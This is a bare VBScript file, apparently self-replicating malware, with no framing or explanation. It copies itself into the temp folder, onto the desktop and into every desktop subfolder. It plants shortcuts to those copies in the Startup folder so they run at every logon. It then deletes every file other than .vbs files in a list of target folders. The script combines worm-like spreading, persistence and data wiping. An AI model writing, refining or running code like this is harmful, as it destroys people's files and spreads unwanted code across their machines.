Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the number of copies you want to create
numCopies = 5

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

For i = 1 To numCopies
    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & i & ".vbs"
    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
    
    ' Get the path to the desktop folder
    strDesktopFolder = objShell.SpecialFolders("Desktop")
    
    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
    
    ' Get the list of folders on the desktop
    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
    Set colFolders = objDesktopFolder.SubFolders
    
    ' Iterate through each folder and create a copy of the script
    For Each objFolder In colFolders
        strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
        objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
    Next
    
    ' Get the path to the startup folder
    strStartupFolder = objShell.SpecialFolders("Startup")
    
    ' Create a shortcut to the copied script in the startup folder for each folder on the desktop
    For Each objFolder In colFolders
        strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
        strFolderShortcutPath = strStartupFolder & "\Copy" & i & "_" & objFolder.Name & ".lnk"
        
        Set objShortcut = objShell.CreateShortcut(strFolderShortcutPath)
        objShortcut.TargetPath = strFolderCopyPath
        objShortcut.Save
    Next
    
    ' Delete all files except VBS files within the specified folders
    For Each folderPath In foldersToDelete
        DeleteFilesExceptVBS folderPath
    Next
Next

Sub DeleteFilesExceptVBS(folderPath)
    Set folder = objFSO.GetFolder(folderPath)
    For Each file In folder.Files
        If objFSO.GetExtensionName(file.Path) <> "vbs" Then
            objFSO.DeleteFile file.Path
        End If
    Next
End Sub
